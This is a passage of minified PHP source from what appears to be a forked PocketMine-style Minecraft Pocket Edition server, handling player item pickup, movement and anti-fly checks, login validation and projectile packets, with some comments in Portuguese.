$pk=new TakeItemEntityPacket();
$pk->eid=$this->getId();
$pk->target=$entity->getId();
Server::broadcastPacket($entity->getViewers(),$pk);
$pk=new TakeItemEntityPacket();
$pk->eid=0;
$pk->target=$entity->getId();
$this->dataPacket($pk);
if($add){$this->getFloatingInventory()->addItem(clone$item);
}
$entity->kill();
}
elseif($entity instanceof DroppedItem){if($entity->getPickupDelay()<=0){$item=$entity->getItem();
if($item instanceof Item){$add=false;
if(!$this->server->allowInventoryCheats and!$this->isCreative()){if(!$this->getFloatingInventory()->canAddItem($item)or!$this->inventory->canAddItem($item)){continue;
}
$add=true;
}
$this->server->getPluginManager()->callEvent($ev=new InventoryPickupItemEvent($this->inventory,$entity));
if($ev->isCancelled()){continue;
}
$pk=new TakeItemEntityPacket();
$pk->eid=$this->getId();
$pk->target=$entity->getId();
Server::broadcastPacket($entity->getViewers(),$pk);
$pk=new TakeItemEntityPacket();
$pk->eid=0;
$pk->target=$entity->getId();
$this->dataPacket($pk);
if($add){$this->getFloatingInventory()->addItem(clone$item);
}
$entity->kill();
}
}
}
}
}
protected function processMovement($tickDiff){if(!$this->isAlive()or!$this->spawned or$this->newPosition===null or$this->teleportPosition!==null){$this->setMoving(false);
return;
}
$newPos=$this->newPosition;
$distanceSquared=$newPos->distanceSquared($this);
$revert=false;
if($this->server->checkMovement){if(($distanceSquared/($tickDiff**2))>200){$revert=true;
}
else{if($this->chunk===null or!$this->chunk->isGenerated()){$chunk=$this->level->getChunk($newPos->x>>4,$newPos->z>>4,false);
if($chunk===null or!$chunk->isGenerated()){$revert=true;
$this->nextChunkOrderRun=0;
}
else{if($this->chunk!==null){$this->chunk->removeEntity($this);
}
$this->chunk=$chunk;
}
}
}
}
else{if($this->chunk===null or!$this->chunk->isGenerated()){$chunk=$this->level->getChunk($newPos->x>>4,$newPos->z>>4,false);
if($chunk===null or!$chunk->isGenerated()){$revert=true;
$this->nextChunkOrderRun=0;
}
else{if($this->chunk!==null){$this->chunk->removeEntity($this);
}
$this->chunk=$chunk;
}
}
}
if(!$revert and$distanceSquared!=0){$dx=$newPos->x-$this->x;
$dy=$newPos->y-$this->y;
$dz=$newPos->z-$this->z;
$this->move($dx,$dy,$dz);
$diffX=$this->x-$newPos->x;
$diffY=$this->y-$newPos->y;
$diffZ=$this->z-$newPos->z;
$yS=0.5+$this->ySize;
if($diffY>=-$yS or$diffY<=$yS){$diffY=0;
}
$diff=($diffX**2+$diffY**2+$diffZ**2)/($tickDiff**2);
}
$from=new Location($this->lastX,$this->lastY,$this->lastZ,$this->lastYaw,$this->lastPitch,$this->level);
$to=$this->getLocation();
$delta=pow($this->lastX-$to->x,2)+pow($this->lastY-$to->y,2)+pow($this->lastZ-$to->z,2);
$deltaAngle=abs($this->lastYaw-$to->yaw)+abs($this->lastPitch-$to->pitch);
if(!$revert and($delta>(1/16)or$deltaAngle>10)){$isFirst=($this->lastX===null or$this->lastY===null or$this->lastZ===null);
$this->lastX=$to->x;
$this->lastY=$to->y;
$this->lastZ=$to->z;
$this->lastYaw=$to->yaw;
$this->lastPitch=$to->pitch;
if(!$isFirst){$ev=new PlayerMoveEvent($this,$from,$to);
$this->setMoving(true);
$this->server->getPluginManager()->callEvent($ev);
if(!($revert=$ev->isCancelled())){if($this->server->netherEnabled){if($this->isInsideOfPortal()){if($this->portalTime==0){$this->portalTime=$this->server->getTick();
}
}
else{$this->portalTime=0;
}
}
if($to->distanceSquared($ev->getTo())>0.01){$this->teleport($ev->getTo());
}
else{$this->addMovement($this->x,$this->y+$this->getEyeHeight(),$this->z,$this->yaw,$this->pitch,$this->yaw);
}
if($this->fishingHook instanceof FishingHook){if($this->distance($this->fishingHook)>33 or$this->inventory->getItemInHand()->getId()!==Item::FISHING_ROD){$this->setFishingHook();
}
}
}
}
if(!$this->isSpectator()){$this->checkNearEntities($tickDiff);
}
$this->speed=$from->subtract($to);
}
elseif($distanceSquared==0){$this->speed=new Vector3(0,0,0);
$this->setMoving(false);
}
if($revert&&!$this->isSpectator()){$this->lastX=$from->x;
$this->lastY=$from->y;
$this->lastZ=$from->z;
$this->lastYaw=$from->yaw;
$this->lastPitch=$from->pitch;
$this->sendPosition($from,$from->yaw,$from->pitch,1);
$this->forceMovement=new Vector3($from->x,$from->y,$from->z);
}
else{$this->forceMovement=null;
if($distanceSquared!=0 and$this->nextChunkOrderRun>20){$this->nextChunkOrderRun=20;
}
}
$this->newPosition=null;
}
public function addMovement($x,$y,$z,$yaw,$pitch,$headYaw=null){if($this->chunk!==null){$this->level->addPlayerMovement($this->chunk->getX(),$this->chunk->getZ(),$this->id,$x,$y,$z,$yaw,$pitch,$this->onGround,$headYaw===null?$yaw:$headYaw);
}
}
public function setMotion(Vector3$mot){if(parent::setMotion($mot)){if($this->chunk!==null){$this->level->addEntityMotion($this->chunk->getX(),$this->chunk->getZ(),$this->getId(),$this->motionX,$this->motionY,$this->motionZ);
$pk=new SetEntityMotionPacket();
$pk->entities[]=[0,$mot->x,$mot->y,$mot->z];
$this->dataPacket($pk);
}
if($this->motionY>0){$this->startAirTicks=(-(log($this->gravity/($this->gravity+$this->drag*$this->motionY)))/$this->drag)*2+5;
}
return true;
}
return false;
}
protected function updateMovement(){}
public$foodTick=0;
public$starvationTick=0;
public$foodUsageTime=0;
protected$moving=false;
public function setMoving($moving){$this->moving=$moving;
}
public function isMoving():bool{return$this->moving;
}
public function sendAttributes(){$entries=$this->attributeMap->needSend();
if(count($entries)>0){$pk=new UpdateAttributesPacket();
$pk->entityId=0;
$pk->entries=$entries;
$this->dataPacket($pk);
foreach($entries as$entry){$entry->markSynchronized();
}
}
}
public function onUpdate($currentTick){if(!$this->loggedIn){return false;
}
$tickDiff=$currentTick-$this->lastUpdate;
if($tickDiff<=0){return true;
}
$this->messageCounter=2;
$this->lastUpdate=$currentTick;
$this->sendAttributes();
if(!$this->isAlive()and$this->spawned){++$this->deadTicks;
if($this->deadTicks>=10){$this->despawnFromAll();
}
return true;
}
$this->timings->startTiming();
if($this->spawned){if($this->server->netherEnabled){if(($this->isCreative()or$this->isSurvival()and$this->server->getTick()-$this->portalTime>=80)and$this->portalTime>0){if($this->server->netherLevel instanceof Level){if($this->getLevel()!=$this->server->netherLevel){$this->fromPos=$this->getPosition();
$this->fromPos->x=((int)$this->fromPos->x)+0.5;
$this->fromPos->z=((int)$this->fromPos->z)+0.5;
$this->teleport($this->shouldResPos=$this->server->netherLevel->getSafeSpawn());
}
elseif($this->fromPos instanceof Position){if(!($this->getLevel()->isChunkLoaded($this->fromPos->x,$this->fromPos->z))){$this->getLevel()->loadChunk($this->fromPos->x,$this->fromPos->z);
}
$add=[1,0,-1,0,0,1,0,-1];
$tempos=null;
for($j=2;
$j<5;
$j++){for($i=0;
$i<4;
$i++){if($this->fromPos->getLevel()->getBlock($this->temporalVector->fromObjectAdd($this->fromPos,$add[$i]*$j,0,$add[$i+4]*$j))->getId()===Block::AIR){if($this->fromPos->getLevel()->getBlock($this->temporalVector->fromObjectAdd($this->fromPos,$add[$i]*$j,1,$add[$i+4]*$j))->getId()===Block::AIR){$tempos=$this->fromPos->add($add[$i]*$j,0,$add[$i+4]*$j);
break;
}
}
}
if($tempos!=null){break;
}
}
if($tempos==null){$tempos=$this->fromPos->add(mt_rand(-2,2),0,mt_rand(-2,2));
}
$this->teleport($this->shouldResPos=$tempos);
$add=null;
$tempos=null;
$this->fromPos=null;
}
else{$this->teleport($this->shouldResPos=$this->server->getDefaultLevel()->getSafeSpawn());
}
$this->portalTime=0;
}
}
}
if(!$this->isSleeping()){$this->processMovement($tickDiff);
}
if(!$this->isSpectator())$this->entityBaseTick($tickDiff);
if($this->isOnFire()or$this->lastUpdate%10==0){if($this->isCreative()and!$this->isInsideOfFire()){$this->extinguish();
}
elseif($this->getLevel()->getWeather()->isRainy()){if($this->getLevel()->canBlockSeeSky($this)){$this->extinguish();
}
}
}
if($this->server->antiFly){
if(!$this->isSpectator() and $this->speed !== null){
if($this->onGround){
if($this->inAirTicks !== 0){
$this->startAirTicks = 5;
}
$this->inAirTicks = 0;
}else{
if(!$this->allowFlight and $this->inAirTicks > 130 and !$this->isSleeping() and $this->getDataProperty(self::DATA_NO_AI) !== 1){
//Aqui temos um sistema de anti Fly que dar kick em jogador por determinado tempo.
$expectedVelocity = (-$this->gravity) / $this->drag - ((-$this->gravity) / $this->drag) * exp(-$this->drag * ($this->inAirTicks - $this->startAirTicks));
$diff = ($this->speed->y - $expectedVelocity) ** 2;
if(!$this->hasEffect(Effect::JUMP) and $diff > 0.6 and $expectedVelocity < $this->speed->y and !$this->server->getAllowFlight()){
$this->setMotion($this->temporalVector->setComponents(0, $expectedVelocity, 0));
if($this->inAirTicks < 130){
//Dica: 20 ticks = 1 segundo
//40 ticks = 2 segundos
//130 ticks = 6,5 segundos e assim por diante seguindo essa logica!
//ou seja se o player ficar 6,5 segundos do bloco de ar ele leva kick (os segundos lagados não contam)
//você pode personalizar quanto tempo quiser.
//Lembrando que o antifly tem que ta ativado.
}elseif($this->kick("Suspeito de Fly")){
$this->timings->stopTiming();
return false;
}
}
}
++$this->inAirTicks;
}
}
}
if($this->getTransactionQueue()!==null){$this->getTransactionQueue()->execute();
}
}
$this->checkTeleportPosition();
$this->timings->stopTiming();
return true;
}
public function checkNetwork(){if(!$this->isOnline()){return;
}
if($this->nextChunkOrderRun--<=0 or$this->chunk===null){$this->orderChunks();
}
if(count($this->loadQueue)>0 or!$this->spawned){$this->sendNextChunk();
}
if(count($this->batchedPackets)>0){$this->server->batchPackets([$this],$this->batchedPackets,false);
$this->batchedPackets=[];
}
}
public function canInteract(Vector3$pos,$maxDistance,$maxDiff=0.5){$eyePos=$this->getPosition()->add(0,$this->getEyeHeight(),0);
if($eyePos->distanceSquared($pos)>$maxDistance**2){return false;
}
$dV=$this->getDirectionPlane();
$dot=$dV->dot(new Vector2($eyePos->x,$eyePos->z));
$dot1=$dV->dot(new Vector2($pos->x,$pos->z));
return($dot1-$dot)>=-$maxDiff;
}
public function onPlayerPreLogin(){$pk=new PlayStatusPacket();
$pk->status=PlayStatusPacket::LOGIN_SUCCESS;
$this->dataPacket($pk);
$this->processLogin();
}
public function clearCreativeItems(){$this->personalCreativeItems=[];
}
public function getCreativeItems():array{return$this->personalCreativeItems;
}
public function addCreativeItem(Item$item){$this->personalCreativeItems[]=Item::get($item->getId(),$item->getDamage());
}
public function removeCreativeItem(Item$item){$index=$this->getCreativeItemIndex($item);
if($index!==-1){unset($this->personalCreativeItems[$index]);
}
}
public function getCreativeItemIndex(Item$item):int{foreach($this->personalCreativeItems as$i=>$d){if($item->equals($d,!$item->isTool())){return$i;
}
}
return-1;
}
protected function processLogin(){if(!$this->server->isWhitelisted(strtolower($this->getName()))){$this->close($this->getLeaveMessage(),"Server is white-listed");
return;
}
elseif($this->server->getNameBans()->isBanned(strtolower($this->getName()))or$this->server->getIPBans()->isBanned($this->getAddress())or$this->server->getCIDBans()->isBanned($this->randomClientId)){$this->close($this->getLeaveMessage(),TextFormat::RED."You are banned");
return;
}
if($this->hasPermission(Server::BROADCAST_CHANNEL_USERS)){$this->server->getPluginManager()->subscribeToPermission(Server::BROADCAST_CHANNEL_USERS,$this);
}
if($this->hasPermission(Server::BROADCAST_CHANNEL_ADMINISTRATIVE)){$this->server->getPluginManager()->subscribeToPermission(Server::BROADCAST_CHANNEL_ADMINISTRATIVE,$this);
}
foreach($this->server->getOnlinePlayers()as$p){if($p!==$this and strtolower($p->getName())===strtolower($this->getName())){if($p->kiick("logged in from another location")===false){$this->close($this->getLeaveMessage(),"Logged in from another location");
return;
}
}
elseif($p->loggedIn and$this->getUniqueId()->equals($p->getUniqueId())){if($p->kiick("logged in from another location")===false){$this->close($this->getLeaveMessage(),"Logged in from another location");
//aqui corrige o bug do server auth quando alguém invade a conta do outro jogador.
return;
}
}
}
$this->setNameTag($this->getDisplayName());
$nbt=$this->server->getOfflinePlayerData($this->username);
$this->playedBefore=($nbt["lastPlayed"]-$nbt["firstPlayed"])>1;
if(!isset($nbt->NameTag)){$nbt->NameTag=new StringTag("NameTag",$this->username);
}
else{$nbt["NameTag"]=$this->username;
}
if(!isset($nbt->Hunger)or!isset($nbt->Health)or!isset($nbt->MaxHealth)){$nbt->Hunger=new ShortTag("Hunger",20);
$nbt->Health=new ShortTag("Health",20);
$nbt->MaxHealth=new ShortTag("MaxHealth",20);
}
$this->food=$nbt["Hunger"];
$this->setMaxHealth($nbt["MaxHealth"]);
Entity::setHealth(($nbt["Health"]<=0)?20:$nbt["Health"]);
$this->gamemode=$nbt["playerGameType"]&0x03;
if($this->server->getForceGamemode()){$this->gamemode=$this->server->getGamemode();
$nbt->playerGameType=new IntTag("playerGameType",$this->gamemode);
}
$this->allowFlight=$this->isCreative();
if(($level=$this->server->getLevelByName($nbt["Level"]))===null){$this->setLevel($this->server->getDefaultLevel());
$nbt["Level"]=$this->level->getName();
$nbt["Pos"][0]=$this->level->getSpawnLocation()->x;
$nbt["Pos"][1]=$this->level->getSpawnLocation()->y;
$nbt["Pos"][2]=$this->level->getSpawnLocation()->z;
}
else{$this->setLevel($level);
}
if(!($nbt instanceof CompoundTag)){$this->close($this->getLeaveMessage(),"Invalid data");
return;
}
$nbt->lastPlayed=new LongTag("lastPlayed",floor(microtime(true)*1000));
if($this->server->getAutoSave()){$this->server->saveOfflinePlayerData($this->username,$nbt,true);
}
parent::__construct($this->level->getChunk($nbt["Pos"][0]>>4,$nbt["Pos"][2]>>4,true),$nbt);
$this->loggedIn=true;
$this->server->addOnlinePlayer($this);
$this->server->getPluginManager()->callEvent($ev=new PlayerLoginEvent($this,"Plugin reason"));
if($ev->isCancelled()){$this->close($this->getLeaveMessage(),$ev->getKickMessage());
return;
}
if(!$this->isConnected()){return;
}
$pk=new PlayStatusPacket();
$pk->status=PlayStatusPacket::LOGIN_SUCCESS;
$this->dataPacket($pk);
if($this->spawnPosition===null and isset($this->namedtag->SpawnLevel)and($level=$this->server->getLevelByName($this->namedtag["SpawnLevel"]))instanceof Level){$this->spawnPosition=new Position($this->namedtag["SpawnX"],$this->namedtag["SpawnY"],$this->namedtag["SpawnZ"],$level);
}
$spawnPosition=$this->getSpawn();
$pk=new StartGamePacket();
$pk->seed=-1;
$pk->dimension=$this->level->getDimension();
$pk->x=$this->x;
$pk->y=$this->y;
$pk->z=$this->z;
$pk->spawnX=(int)$spawnPosition->x;
$pk->spawnY=(int)$spawnPosition->y;
$pk->spawnZ=(int)$spawnPosition->z;
$pk->generator=1;
$pk->gamemode=$this->gamemode&0x01;
$pk->eid=0;
$this->dataPacket($pk);
$pk=new SetTimePacket();
$pk->time=$this->level->getTime();
$pk->started=$this->level->stopTime==false;
$this->dataPacket($pk);
$pk=new SetSpawnPositionPacket();
$pk->x=(int)$spawnPosition->x;
$pk->y=(int)$spawnPosition->y;
$pk->z=(int)$spawnPosition->z;
$this->dataPacket($pk);
$pk=new SetHealthPacket();
$pk->health=$this->getHealth();
$this->dataPacket($pk);
$pk=new SetDifficultyPacket();
$pk->difficulty=$this->server->getDifficulty();
$this->dataPacket($pk);
$this->server->getLogger()->info($this->getServer()->getLanguage()->translateString("pocketmine.player.logIn",[TextFormat::AQUA.$this->username.TextFormat::WHITE,$this->ip,$this->port,TextFormat::GREEN.$this->randomClientId.TextFormat::WHITE,$this->id,$this->level->getName(),round($this->x,4),round($this->y,4),round($this->z,4)]));
if($this->gamemode===Player::SPECTATOR){$pk=new ContainerSetContentPacket();
$pk->windowid=ContainerSetContentPacket::SPECIAL_CREATIVE;
$this->dataPacket($pk);
}
else{$pk=new ContainerSetContentPacket();
$pk->windowid=ContainerSetContentPacket::SPECIAL_CREATIVE;
$pk->slots=array_merge(Item::getCreativeItems(),$this->personalCreativeItems);
$this->dataPacket($pk);
}
$pk=new SetEntityDataPacket();
$pk->eid=0;
$pk->metadata=[self::DATA_LEAD_HOLDER=>[self::DATA_TYPE_LONG,-1]];
$this->dataPacket($pk);
$this->level->getWeather()->sendWeather($this);
$this->forceMovement=$this->teleportPosition=$this->getPosition();
}
public function getProtocol(){return$this->protocol;
}
public function getGameVersion(){return "0.15";
}
public function handleDataPacket($packet){if($this->connected===false){return;
}
if($packet::NETWORK_ID===ProtocolInfo::BATCH_PACKET or$packet::NETWORK_ID===0x92){$this->server->getNetwork()->processBatch($packet,$this);
return;
}
$this->server->getPluginManager()->callEvent($ev=new DataPacketReceiveEvent($this,$packet));
if($ev->isCancelled()){return;
}
switch($packet::NETWORK_ID){case ProtocolInfo::ITEM_FRAME_DROP_ITEM_PACKET:$tile=$this->level->getTile($this->temporalVector->setComponents($packet->x,$packet->y,$packet->z));
if($tile instanceof ItemFrame){$block=$this->level->getBlock($tile);
$this->server->getPluginManager()->callEvent($ev=new BlockBreakEvent($this,$block,$this->getInventory()->getItemInHand(),true));
if(!$ev->isCancelled()){$item=$tile->getItem();
$this->server->getPluginManager()->callEvent($ev=new ItemFrameDropItemEvent($this,$block,$tile,$item));
if(!$ev->isCancelled()){if($item->getId()!==Item::AIR){if((mt_rand(0,10)/10)<$tile->getItemDropChance()){$this->level->dropItem($tile,$item);
}
$tile->setItem(Item::get(Item::AIR));
$tile->setItemRotation(0);
}
}
else$tile->spawnTo($this);
}
else$tile->spawnTo($this);
}
break;
case ProtocolInfo::REQUEST_CHUNK_RADIUS_PACKET:$pk=new ChunkRadiusUpdatedPacket();
$pk->radius=($this->server->chunkRadius!=-1)?$this->server->chunkRadius:$packet->radius;
$this->dataPacket($pk);
break;
case ProtocolInfo::PLAYER_INPUT_PACKET:break;
case ProtocolInfo::LOGIN_PACKET:if($this->loggedIn){break;
}
$pk=new PlayStatusPacket();
$pk->status=PlayStatusPacket::LOGIN_SUCCESS;
$this->dataPacket($pk);
$this->username=TextFormat::clean($packet->username);
$this->displayName=$this->username;
$this->setNameTag($this->username);
$this->iusername=strtolower($this->username);
$this->protocol=$packet->protocol;
if($this->server->getConfigBoolean("online-mode",false)&&$packet->identityPublicKey===null){$this->kick("disconnectionScreen.notAuthenticated",false);
break;
}
if(count($this->server->getOnlinePlayers())>=$this->server->getMaxPlayers()and$this->kick("disconnectionScreen.serverFull",false)){break;
}
if($packet->protocol!==ProtocolInfo::CURRENT_PROTOCOL){$pk=new PlayStatusPacket();
$pk->status=PlayStatusPacket::LOGIN_FAILED_SERVER;
$this->directDataPacket($pk);
$this->close("","This server does not support your client",\false);
break;
}
$this->randomClientId=$packet->clientId;
$this->uuid=UUID::fromString($packet->clientUUID);
$this->rawUUID=$this->uuid->toBinary();
$valid=true;
$len=strlen($packet->username);
if($len>16 or$len<3){$valid=false;
}
for($i=0;
$i<$len and$valid;
++$i){$c=ord($packet->username[$i]
);
if(($c>=ord("a")and$c<=ord("z"))or($c>=ord("A")and$c<=ord("Z"))or($c>=ord("0")and$c<=ord("9"))or$c===ord("_")){continue;
}
$valid=false;
break;
}
if(!$valid or$this->iusername==="rcon"or$this->iusername==="console"){$this->close("","disconnectionScreen.invalidName");
break;
}
if((strlen($packet->skin)!=64*64*4)and(strlen($packet->skin)!=64*32*4)){$this->close("","disconnectionScreen.invalidSkin");
break;
}
if($packet->protocol==84){$this->setSkin($packet->skin,$packet->skinId);
}
else{$this->setSkin($packet->skin,$packet->skinName);
}
$this->server->getPluginManager()->callEvent($ev=new PlayerPreLoginEvent($this,"Plugin reason"));
if($ev->isCancelled()){$this->close("",$ev->getKickMessage());
break;
}
if($this->isConnected()){$this->onPlayerPreLogin();
}
break;
case ProtocolInfo::MOVE_PLAYER_PACKET;
if($this->linkedEntity instanceof Entity){$entity=$this->linkedEntity;
if($entity instanceof Boat){$entity->setPosition($this->temporalVector->setComponents($packet->x,$packet->y-0.3,$packet->z));
}
}
$newPos=new Vector3($packet->x,$packet->y-$this->getEyeHeight(),$packet->z);
$revert=false;
if(!$this->isAlive()or$this->spawned!==true){$revert=true;
$this->forceMovement=new Vector3($this->x,$this->y,$this->z);
}
if($this->teleportPosition!==null or($this->forceMovement instanceof Vector3 and(($dist=$newPos->distanceSquared($this->forceMovement))>0.1 or$revert))){if($this->forceMovement instanceof Vector3)$this->sendPosition($this->forceMovement,$packet->yaw,$packet->pitch);
}
else{$packet->yaw%=360;
$packet->pitch%=360;
if($packet->yaw<0){$packet->yaw+=360;
}
$this->setRotation($packet->yaw,$packet->pitch);
$this->newPosition=$newPos;
}
$this->forceMovement=null;
break;//D snow AQUI COMEÇA A CORRIGIR O ERRO DO PROJÉTIL DO MCPE 0.14.3
case ProtocolInfo::MOB_EQUIPMENT_PACKET:if($this->spawned===false or!$this->isAlive()){break;
}
$this->inventory->setHeldItemIndex($packet->selectedSlot,false,$packet->slot);
$this->setDataFlag(self::DATA_FLAGS,self::DATA_FLAG_ACTION,false);
break;
case ProtocolInfo::USE_ITEM_PACKET:if($this->spawned===false or!$this->isAlive()or$this->blocked){break;
}
$blockVector=new Vector3($packet->x,$packet->y,$packet->z);
$this->craftingType=self::CRAFTING_SMALL;
if($packet->face>=0 and$packet->face<=5){$this->setDataFlag(self::DATA_FLAGS,self::DATA_FLAG_ACTION,false);
if(!$this->canInteract($blockVector->add(0.5,0.5,0.5),13)or$this->isSpectator()){}
elseif($this->isCreative()){$item=$this->inventory->getItemInHand();
if($this->level->useItemOn($blockVector,$item,$packet->face,$packet->fx,$packet->fy,$packet->fz,$this)===true){break;
}
}
elseif(!$this->inventory->getItemInHand()->deepEquals($packet->item)and$this->getProtocol()==84){$this->inventory->sendHeldItem($this);
}
else{$item=$this->inventory->getItemInHand();
$oldItem=clone$item;
if($this->level->useItemOn($blockVector,$item,$packet->face,$packet->fx,$packet->fy,$packet->fz,$this)){if(!$item->deepEquals($oldItem)or$item->getCount()!==$oldItem->getCount()){$this->inventory->setItemInHand($item);
$this->inventory->sendHeldItem($this->hasSpawned);
}
break;
}
}
$this->inventory->sendHeldItem($this);
if($blockVector->distanceSquared($this)>10000){break;
}
$target=$this->level->getBlock($blockVector);
$block=$target->getSide($packet->face);
$this->level->sendBlocks([$this],[$target,$block],UpdateBlockPacket::FLAG_ALL_PRIORITY);
break;
}
elseif($packet->face===0xff){if($this->isSpectator()){break;
}
$aimPos=(new Vector3($packet->x/32768,$packet->y/32768,$packet->z/32768))->normalize();
if($this->isSurvival()){$item=$this->inventory->getItemInHand();
}
else{$item=$this->inventory->getItemInHand();
}//snow Aqui terminou a correção do bug dos PROJÉTIL no MCPE 0.14.3
$ev=new PlayerInteractEvent($this,$item,$aimPos,$packet->face,PlayerInteractEvent::RIGHT_CLICK_AIR);
$this->server->getPluginManager()->callEvent($ev);
if($ev->isCancelled()){$this->inventory->sendHeldItem($this);
break;
}
if($item->getId()===Item::FISHING_ROD){if($this->isFishing()){$this->server->getPluginManager()->callEvent($ev=new PlayerUseFishingRodEvent($this,PlayerUseFishingRodEvent::ACTION_STOP_FISHING));
}
else{$this->server->getPluginManager()->callEvent($ev=new PlayerUseFishingRodEvent($this,PlayerUseFishingRodEvent::ACTION_START_FISHING));
}
if(!$ev->isCancelled()){if($this->isFishing()){$this->setFishingHook();
}
else{$nbt=new CompoundTag("",["Pos"=>new ListTag("Pos",[new DoubleTag("",$this->x),new DoubleTag("",$this->y+$this->getEyeHeight()),new DoubleTag("",$this->z)]),"Motion"=>new ListTag("Motion",[new DoubleTag("",-sin($this->yaw/180*M_PI)*cos($this->pitch/180*M_PI)),new DoubleTag("",-sin($this->pitch/180*M_PI)),new DoubleTag("",cos($this->yaw/180*M_PI)*cos($this->pitch/180*M_PI))]),"Rotation"=>new ListTag("Rotation",[new FloatTag("",$this->yaw),new FloatTag("",$this->pitch)])]);
$f=0.5;
$this->fishingHook=new FishingHook($this->chunk,$nbt,$this,$this->getId());
$this->fishingHook->setMotion($this->fishingHook->getMotion()->multiply($f));
$this->fishingHook->spawnToAll();
}
}
}
elseif($item->getId()===Item::SNOWBALL){$nbt=new CompoundTag("",["Pos"=>new ListTag("Pos",[new DoubleTag("",$this->x),new DoubleTag("",$this->y+$this->getEyeHeight()),new DoubleTag("",$this->z)]),"Motion"=>new ListTag("Motion",[new DoubleTag("",-sin($this->yaw/180*M_PI)*cos($this->pitch/180*M_PI)),new DoubleTag("",-sin($this->pitch/180*M_PI)),new DoubleTag("",cos($this->yaw/180*M_PI)*cos($this->pitch/180*M_PI))]),"Rotation"=>new ListTag("Rotation",[new FloatTag("",$this->yaw),new FloatTag("",$this->pitch)]),]);
$f=1.5;
$snowball=Entity::createEntity("Snowball",$this->chunk,$nbt,$this);
$snowball->setMotion($snowball->getMotion()->multiply($f));
if($this->isSurvival()){$item->setCount($item->getCount()-1);
$this->inventory->setItemInHand($item->getCount()>0?$item:Item::get(Item::AIR));
}
if($snowball instanceof Projectile){$this->server->getPluginManager()->callEvent($projectileEv=new ProjectileLaunchEvent($snowball));
if($projectileEv->isCancelled()){$snowball->kill();
}
else{$snowball->spawnToAll();
$this->level->addSound(new LaunchSound($this),$this->getViewers());
}
}
else{$snowball->spawnToAll();
}
}
elseif($item->getId()===Item::EGG){$nbt=new CompoundTag("",["Pos"=>new ListTag("Pos",[new DoubleTag("",$this->x),new DoubleTag("",$this->y+$this->getEyeHeight()),new DoubleTag("",$this->z)]),"Motion"=>new ListTag("Motion",[new DoubleTag("",-sin($this->yaw/180*M_PI)*cos($this->pitch/180*M_PI)),new DoubleTag("",-sin($this->pitch/180*M_PI)),new DoubleTag("",cos($this->yaw/180*M_PI)*cos($this->pitch/180*M_PI))]),"Rotation"=>new ListTag("Rotation",[new FloatTag("",$this->yaw),new FloatTag("",$this->pitch)]),]);
$f=1.5;
$egg=Entity::createEntity("Egg",$this->chunk,$nbt,$this);
$egg->setMotion($egg->getMotion()->multiply($f));
if($this->isSurvival()){$item->setCount($item->getCount()-1);
$this->inventory->setItemInHand($item->getCount()>0?$item:Item::get(Item::AIR));
}
if($egg instanceof Projectile){$this->server->getPluginManager()->callEvent($projectileEv=new ProjectileLaunchEvent($egg));
if($projectileEv->isCancelled()){$egg->kill();
}
else{$egg->spawnToAll();
$this->level->addSound(new LaunchSound($this),$this->getViewers());
}
}
else{$egg->spawnToAll();
}
}
elseif($item->getId()==Item::ENCHANTING_BOTTLE){$nbt=new CompoundTag("",["Pos"=>new ListTag("Pos",[new DoubleTag("",$this->x),new DoubleTag("",$this->y+$this->getEyeHeight()),new DoubleTag("",$this->z)]),"Motion"=>new ListTag("Motion",[new DoubleTag("",-sin($this->yaw/180*M_PI)*cos($this->pitch/180*M_PI)),new DoubleTag("",-sin($this->pitch/180*M_PI)),new DoubleTag("",cos($this->yaw/180*M_PI)*cos($this->pitch/180*M_PI))]),"Rotation"=>new ListTag("Rotation",[new FloatTag("",$this->yaw),new FloatTag("",$this->pitch)]),]);
$f=1.1;
$thrownExpBottle=new ThrownExpBottle($this->chunk,$nbt,$this);
$thrownExpBottle->setMotion($thrownExpBottle->getMotion()->multiply($f));
if($this->isSurvival()){$item->setCount($item->getCount()-1);
$this->inventory->setItemInHand($item->getCount()>0?$item:Item::get(Item::AIR));
}
if($thrownExpBottle instanceof Projectile){$this->server->getPluginManager()->callEvent($projectileEv=new ProjectileLaunchEvent($thrownExpBottle));
if($projectileEv->isCancelled()){$thrownExpBottle->kill();
}
else{$thrownExpBottle->spawnToAll();
$this->level->addSound(new LaunchSound($this),$this->getViewers());
}
}
else{$thrownExpBottle->spawnToAll();
}
}
elseif($item->getId()==Item::SPLASH_POTION and$this->server->allowSplashPotion){$nbt=new CompoundTag("",["Pos"=>new ListTag("Pos",[new DoubleTag("",$this->x),new DoubleTag("",$this->y+$this->getEyeHeight()),new DoubleTag("",$this->z)]),"Motion"=>new ListTag("Motion",[new DoubleTag("",-sin($this->yaw/180*M_PI)*cos($this->pitch/180*M_PI)),new DoubleTag("",-sin($this->pitch/180*M_PI)),new DoubleTag("",cos($this->yaw/180*M_PI)*cos($this->pitch/180*M_PI))]),"Rotation"=>new ListTag("Rotation",[new FloatTag("",$this->yaw),new FloatTag("",$this->pitch)]),"PotionId"=>new ShortTag("PotionId",$item->getDamage()),]);
$f=1.1;
$thrownPotion=new ThrownPotion($this->chunk,$nbt,$this);
$thrownPotion->setMotion($thrownPotion->getMotion()->multiply($f));
if($this->isSurvival()){$item->setCount($item->getCount()-1);
$this->inventory->setItemInHand($item->getCount()>0?$item:Item::get(Item::AIR));
}
if($thrownPotion instanceof Projectile){$this->server->getPluginManager()->callEvent($projectileEv=new ProjectileLaunchEvent($thrownPotion));
if($projectileEv->isCancelled()){$thrownPotion->kill();
}
else{$thrownPotion->spawnToAll();
$this->level->addSound(new LaunchSound($this),$this->getViewers());
}
}
else{$thrownPotion->spawnToAll();
}
}
$this->setDataFlag(self::DATA_FLAGS,self::DATA_FLAG_ACTION,true);
$this->startAction=$this->server->getTick();
}
break;
case ProtocolInfo::PLAYER_ACTION_PACKET:if($this->spawned===false or$this->blocked===true or(!$this->isAlive()and$packet->action!==PlayerActionPacket::ACTION_SPAWN_SAME_DIMENSION and$packet->action!==PlayerActionPacket::ACTION_SPAWN_OVERWORLD)){break;
}
$packet->eid=$this->id;
$pos=new Vector3($packet->x,$packet->y,$packet->z);
switch($packet->action){case PlayerActionPacket::ACTION_START_BREAK:if($pos->distanceSquared($this)>10000){break;
}
$target=$this->level->getBlock($pos);
$ev=new PlayerInteractEvent($this,$this->inventory->getItemInHand(),$target,$packet->face,$target->getId()===0?PlayerInteractEvent::LEFT_CLICK_AIR:PlayerInteractEvent::LEFT_CLICK_BLOCK);
$this->getServer()->getPluginManager()->callEvent($ev);
if(!$ev->isCancelled()){$side=$target->getSide($packet->face);
if($side instanceof Fire){$side->getLevel()->setBlock($side,new Air());
}
$this->lastBreak=microtime(true);
}
else{$this->inventory->sendHeldItem($this);
}
break;
